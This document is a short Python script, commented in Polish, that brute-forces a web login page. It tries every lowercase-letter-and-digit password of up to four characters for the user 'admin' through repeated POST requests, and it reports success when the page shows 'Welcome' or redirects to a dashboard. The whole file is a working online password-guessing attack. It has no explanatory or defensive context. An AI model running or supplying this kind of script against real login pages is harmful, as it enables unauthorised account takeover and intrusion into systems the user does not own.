import requests
import itertools
import string
url = "" #wprowadź URL strony logowania
login = "admin" #wprowadź login, który chcesz sprawdzić
znaki = string.ascii_lowercase + string.digits
maks_dlugosc = 4
#generujemy kombinacje od długości 1 do maks_dlugosc
for dlugosc in range(1, maks_dlugosc + 1):
    for kombinacja in itertools.product(znaki, repeat=dlugosc):
        haslo = ''.join(kombinacja)
        dane = {
            "username": login,
            "password": haslo
        }
        response = requests.post(url, data=dane)

        if "Welcome" in response.text or "Dashboard" in response.url:
            print(f"Hasło znalezione: {login}:{haslo}")
            exit(0)
        print(f"Próbuję: {haslo}")
